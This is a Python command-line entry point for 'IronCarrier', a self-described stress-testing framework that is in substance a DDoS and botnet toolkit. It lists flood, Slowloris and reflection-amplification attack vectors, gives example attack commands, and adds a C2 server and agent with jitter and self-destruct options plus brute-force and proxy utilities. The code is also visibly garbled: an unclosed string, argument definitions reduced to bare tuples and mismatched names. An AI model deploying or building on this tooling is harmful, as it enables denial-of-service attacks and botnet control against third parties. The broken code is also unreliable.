#!/usr/bin/env python3
"""
Ironcarrier CLI Entry Point
"""

import os
import sys

def main():
    if os.geteuid() != 0:
        print("[-] Root privileges required for raw socket operations")
        sys.exit(1)
    
    import argparse
    
    parser = argparse.ArgumentParser(
        prog='ironcarrier',
        description='IronCarrier - Multi-Vector Stress Testing Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  # List available vectors
  python -m ironcarrier --list-vectors
  
  # TCP flood
  python -m ironcarrier -m tcp_flood -t 1.2.3.4 -p 80 -d 120 -T 200
  
  # UDP flood with custom size
  python -m ironcarrier -m udp_flood -t 1.2.3.4 -p 53 -d 300 --size 4096
  
  # SYN flood high thread count
  python -m ironcarrier -m syn_flood -t 1.2.3.4 -p 443 -d 60 -T 1000
  
  # HTTP flood with SSL
  python -m ironcarrier -m http_flood -t example.com -p 443 -d 60 --ssl --path /api/v1/
  
  # Slowloris with max connections
  python -m ironcarrier -m slowloris -t example.com -p 80 -d 300 -T 500 --max-conn 1000
  
  # DNS amplification with reflector list
  python -m ironcarrier -m dns_amp -t 1.2.3.4 -p 80 -d 60 -r reflectors/dns/global.txt
  
  # Use custom config
  python -m ironcarrier -c configs/stealth.yaml -m syn_flood -t 1.2.3.4 -p 443 -d 60
  
  # Run as C2 server
  python -m ironcarrier --c2-server --bind 0.0.0.0 --port 8443
  
  # Run as C2 agent
  python -m ironcarrier --c2-client --server 1.2.3.4 --port 8443
  
  # Start web GUI
  python -m ironcarrier --gui --host 0.0.0.0 --port 5000
  
  # Start TUI
  python -m ironcarrier --tui
  
  # Run utility modules
  python -m ironcarrier.utils scan -t 192.168.1.1 --ports 1-1000
  python -m ironcarrier.utils brute -t example.com
  python - ironcarrier.utils proxy -f proxies.txt -o working.txt
  python -m ironcarrier.utils geo -t 8.8.8.8
  
# ═══════════════════════════════════════════════════════════════

def list_vectors(args):
    from .vectors.layer4.tcp_flood import Attack as TCPFlood
    from .vectors.layer4.udp_flood import Attack as UDPFlood
    from .vectors.layer4.syn_flood import Attack as SYNFlood
    from .vectors.layer4.ack_flood import Attack as ACKFlood
    from .vectors.layer4.udp_lag import Attack as UDPLag
    from .vectors.layer4.blacknurse import Attack as BlackNurse
    from .vectors.layer7.http_flood import Attack as HTTPFlood
    from .vectors.layer7.http_bypass import Attack as HTTPBypass
    from .vectors.layer7.slowloris import Attack as Slowloris
    from .brain_vectors.layer7.slowpost import Attack as SlowPost
    from .vectors.layer7.rage import Attack as Rage
    from .vectors.layer7.hammer import Attack as Hammer
    from .vectors.amplification.dns_amp import Attack as DNSAmp
    from .vectors.amplification.ntp_amp import Attack as NTPAmp
    from .vectors.amplification.memcached_amp import Attack as MemcachedAmp
    from .vectors.amplification.ssdp_amp import Attack as SSDPAmp
    from .vectors.amplification.cldap_amp import Attack as CLDAPAmp
    from .vectors.amplification.chargen_amp import Attack as ChargenAmp
    from .vectors.amplification.misc_amp import Attack as MiscAmp
    
    vectors = {
        'Layer 4': {
            'tcp_flood': TCPFlood,
            'udp_flood': UDPFlood,
            'syn_flood': SYNFlood,
            'ack_flood': ACKFlood,
            'udp_lag': UDPLag,
            'blacknurse': BlackNurse,
        },
        'Layer 7': {
            'http_flood': HTTPFlood,
            'http_bypass': HTTPBypass,
            'slowloris': Slowloris,
            'slowpost': SlowPost,
            'rage': Rage,
            'hammer': Hammer,
        },
        'Amplification': {
            'dns_amp': DNSAmp,
            'ntp_amp': NTPAmp,
            'memcached_amp': MemcachedAmp,
            'ssdp_amp': SSDPAmp,
            'cldap_amp': CLDAPAmp,
            'chargen_amp': chargenAmp,
            'misc_amp': MiscAmp,
        }
    }
    
    for category, items in vectors.items():
        print(f"\n  [{category}]")
        for name, cls in items.items():
            print(f"    {name}")
    print()
    return 0

def run_attack(args):
    from .core import Engine, AttackJob
    from .vectors.layer4.tcp_flood import Attack as TCPFlood
    
    config_path = args.config
    if config_path and not os.path.exists(config_path):
        print(f"[-] Config not found: {config_path}")
        return 1
    
    engine = Engine(config_path)
    job = AttackJob(
        target=args.target,
        port=args.port,
        vector=args.method,
        duration=args.duration,
        threads=args.threads,
        options={
            'size': args.size,
            'ssl': args.ssl,
            'path': args.path,
            'max_conn': args.max_conn,
            'cache_bust': True,
            'reflector_file': args.reflector,
            'query_type': args.query_type,
            'amp_port': args.amp_port,
            'amp_type': args.amp_type,
            'method': args.http_method,
            'min_delay': args.min_delay,
            'max_delay': args.max_delay,
            'headers_per_interval': args.headers_per_interval,
            'interval': args.interval,
            'ttl': args.ttl,
            'payload_size': args.payload_size,
            'flags': args.flags,
        }
    )
    
    try:
        success = engine.launch(job)
        engine.stats.print_summary()
        return 0 if success else 1
    except KeyboardInterrupt:
        print("\n[*] Interrupted")
        engine.stop()
        return 130
    except Exception as e:
        print(f"[-] Error: {e}")
        return 1

def run_utils(args):
    args_parts = args.utils.split('.')
    module_path = f"ironcarrier.utils.{args_parts[0]}"
    
    try:
        mod = __import__(module_path, fromlist=[args_parts[1]])
        
        func = getattr(mod, args_parts[1], None)
        if not func:
            print(f"[-] Function {args_parts[1]} not found in {module_path}")
            return 1
        
        kwargs = vars(args)
        del kwargs['utils']
        del kwargs['func']
        
        result = func(**kwargs)
        if result is None:
            return 1
        return 0
    except ImportError as e:
        print(f"[-] Cannot import {module_path}: {e}")
        return 1

def run_c2_server(args):
    from .c2.server import C2Server
    from .c2.encryption import KeyPair
    
    print(f"[*] Generating server keypair...")
    keypair = keypair = KeyPair()
    print(f"[*] Public key fingerprint ready")
    print(f"    PEM length: {len(keypair.get_public_preamble())} bytes")
    
    server = C2Server(
        bind_addr=args.bind,
        bind_port=args.port,
        ssl_cert=args.ssl_cert,
        ssl_key=args.ssl_key,
        password=args.password,
    )
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[*] Stopping C2 server...")
        server.stop()
    
    return 0

def run_c2_client(args):
    from .c2.client import C2Client, AgentConfig
    
    config = AgentConfig(
        server_host=args.server,
        server_port=args.port,
        use_ssl=not args.no_ssl,
        reconnect_interval=args.reconnect,
        heartbeat_interval=args.heartbeat,
        jitter_max=args.jitter,
    )
    
    if args.kill_date:
        from datetime import datetime, timedelta
        config.kill_date = (datetime.now() + timedelta(days=args.kill_date)).timestamp()
    
    client = C2Client(config)
    
    def on_connect(agent):
        print(f"[+] Agent registered: {agent.info.agent_id} ({agent.info.hostname} @ {agent.info.ip_address})")
    
    client.on_connect(on_connect)
    
    try:
        client.start()
    except KeyboardInterrupt:
        print("\n[*] Stopping agent...")
        client.stop()
    
    return 0

def run_gui(args):
    from .gui.web.app import create_app
    
    app = create_app()
    app.run(host=args.host, port=args.port, debug=args.debug)

def run_tui(args):
    from .gui.tui.main import IronCarrierTUI
    from .c2.server import C2Server
    
    c2 = None
    if args.c2:
        from .c2.server import C2Server
        c2 = C2Server(bind_port=8443)
        c2._running = True  # Fake running state for display
    
    tui = IronCarrierTUI(c2)
    tui.run()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        prog='ironcarrier',
        description='IronCarrier - Multi-Vector Stress Testing Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  python -m ironcarrier --list-vectors
  python -m ironcarrier -m tcp_flood -t 1.2.3.4 -p 80 -d 60 -T 200
  python -m ironcarrier -m syn_flood -t 1.2.3.4 -p 443 -d 120 -T 500
  python -m ironcarrier -m http_flood -t example.com -p 443 -d 60 --ssl
  python -m ironcarrier -m slowloris -t example.com -p 80 -d 300 -T 500
  python -m ironcarrier -m dns_amp -t 1.2.3.4 -p 80 -d 60 -r reflectors/dns/global.txt
  python -m ironcarrier -c configs/stealth.yaml -m syn_flood -t 1.2.3.4 -p 443 -d 60
  python -m ironcarrier --c2-server --port 8443
  python -m ironcarrier --c2-client --server 1.2.3.4 --port 8443
  python -m ironcarrier --gui --port 5000
  python -m ironcarrier --tui
  python -m ironcarrier.utils scan -t 192.168.1.1 --ports 1-1000
  python -m ironcarrier.utils brute -t example.com
  python -m ironcarrier.utils geo -t 8.8.8.8
  python -m ironcarrier.utils proxy -f proxies.txt -o working.txt
""")

    parser.add_argument('--list-vectors', action='store_true', help='List available attack vectors')
    
    parser.add_argument('-c', '--config', help='Path to config file')
    
    # Attack arguments
    attack = parser.add_argument('-m', '--method', help='Attack vector name')
    parser.add_argument('-t', '--target', help='Target IP or hostname')
    parser.add_argument('-p', '--port', type=int, help='Target port')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Duration in seconds')
    '-T', '--threads', type=int, default=100, help='Thread count')
    
    # Vector-specific
    parser.add_argument('--size', type=int, default=1024, help='Packet size (UDP)')
    parser.add_argument('--ssl', action='store_true', help='Use SSL/TLS')
    parser.add_argument('--path', default='/', help='URL path (HTTP)')
    '--max-conn', '--max_conn', type=int, default=500, help='Max connections (Slowloris)')
    '--cache-bust', action='store_true', default=True, help='Add cache buster')
    '--reflector', help='Reflector list file')
    '--query-type', default='ANY', choices=['ANY', 'TXT', 'DNSKEY'], help='DNS query type')
    '--amp-port', type=int, default=53, help='Amplification reflector port')
    '--amp-type', default='dns', choices=['dns', 'ntp', 'memcached', 'ssdp', 'cldap', 'chargen', 'misc'], help='Amplification type')
    '--http-method', default='GET', choices=['GET', 'POST', 'HEAD', 'OPTIONS'], help='HTTP method')
    '--min-delay', type=float, default=0.01, help='Min delay (UDP Lag)')
    '--max-delay', type=float, default=0.1, help='Max delay (UDP Lag)')
    '--headers-per-interval', type=int, default=5, help='Headers per interval (Slowloris)')
    '--interval', type=int, default=15, help='Interval between sends (Slowloris)')
    '--ttl', type=int, default=64, help='TTL value')
    '--payload-size', type=int, default=0, help='Payload size (TCP)')
    '--flags', nargs='+', default=['SYN', 'ACK', 'PSH+ACK'], help='TCP flags')
    
    # Utils
    parser.add_argument('--utils', nargs='+', help='Run utility module: module.function [args]')
    
    # C2
    c2 = parser.add_argument('--c2-server', action='store_true', help='Start C2 server')
    '--c2-client', '--c2-client', action='store_true', help='Run C2 agent')
    '--bind', default='0.0.0.0', help='C2 bind address')
    '--port', type=int, default=8443, help='C2 port')
    '--ssl-cert', help='SSL certificate path (C2 server)')
    '--ssl-key', help='SSL key path (C2 server)')
    '--password', help='C2 auth password')
    
    '--no-ssl', action='store_true', help='Disable SSL for C2 client')
    '--reconnect', type=float, default=30.0, help='Reconnect interval (C2 client)')
    '--heartbeat', type=float, default=60.0, help='Heartbeat interval')
    '--jitter', type=float, default=10.0, help='Max jitter (C2 client)')
    '--kill-date', type=int, default=0, help='Self-destruct after N days (C2 client)')
    
    # GUI
    parser.add_argument('--gui', action='store_true', help='Start web GUI')
    '--host', default='0.0.0.0', help='GUI bind address')
    '--debug', action='store_true', help='Debug mode (Flask)')
    
    # TUI
    parser.add_argument('--tui', action='store_true', help='Start terminal UI')
    
    args = parser.parse_args()
    
    if args.list_vectors:
        sys.exit(list_vectors(args))
    elif args.utils:
        sys.exit(run_utils(args))
    elif args.c2_server:
        sys.exit(run_c2_server(args))
    elif args.c2_client:
        sys.exit(run_c2_client(args))
    elif args.gui:
        sys.exit(run_gui(args))
    elif args.tui:
        sys.exit(run_tui(args))
    elif args.method and args.target:
        sys.exit(run_attack(args))
    else:
        parser.print_help()

    sys.exit(0)
